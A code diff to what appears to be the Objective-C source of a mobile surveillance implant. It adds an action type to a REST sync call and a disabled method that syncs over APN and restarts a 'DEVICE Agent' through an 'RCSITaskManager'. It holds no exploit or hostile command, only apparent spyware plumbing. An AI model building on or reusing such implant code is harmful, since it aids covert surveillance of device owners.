@@ -26,7 +26,8 @@
 
   NSData *syncConfig = [[aConfiguration objectForKey: @"data"] retain];
   RESTNetworkProtocol *protocol = [[RESTNetworkProtocol alloc]
-                                   initWithConfiguration: syncConfig];
+                                   initWithConfiguration: syncConfig
+                                                 andType: ACTION_SYNC];
 
   if ([protocol perform] == NO)
     {
@@ -71,6 +72,62 @@
   
   return YES;
 }
+
+#if 0
+- (BOOL)actionSyncAPN: (NSMutableDictionary *)aConfiguration
+{
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  [aConfiguration retain];
+
+  NSData *syncConfig = [[aConfiguration objectForKey: @"data"] retain];
+  RESTNetworkProtocol *protocol = [[RESTNetworkProtocol alloc]
+                                   initWithConfiguration: syncConfig
+                                                 andType: ACTION_SYNC_APN];
+
+  if ([protocol perform] == NO)
+    {
+#ifdef DEBUG_ACTIONS
+      errorLog(@"An error occurred while syncing over APN with REST proto");
+#endif
+    }
+  else
+    {
+      BOOL bSuccess = NO;
+      
+      RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
+      
+      NSMutableDictionary *agentConfiguration = [taskManager getConfigForAgent: AGENT_DEVICE];
+      
+      deviceStruct *tmpDevice = 
+      (deviceStruct*)[[agentConfiguration objectForKey: @"data"] bytes];
+      
+      if (tmpDevice != nil &&
+          tmpDevice->isEnabled == AGENT_DEV_ENABLED)
+        {          
+          bSuccess = [taskManager startAgent: AGENT_DEVICE];
+          
+#ifdef DEBUG
+          NSLog(@"%s: sync performed... restarting DEVICE Agent %d", __FUNCTION__, bSuccess);
+#endif
+        }
+      else
+        {
+#ifdef DEBUG
+          NSLog(@"%s: sync performed... DEVICE Agent dont restarted", __FUNCTION__);
+#endif
+        }
+    }
+  
+  NSNumber *status = [NSNumber numberWithInt: 0];
+  [aConfiguration setObject: status forKey: @"status"];
+
+  [protocol release];  
+  [aConfiguration release];
+  [outerPool release];
+  
+  return YES;
+}
+#endif
 
 - (BOOL)actionAgent: (NSMutableDictionary *)aConfiguration start: (BOOL)aFlag
 {
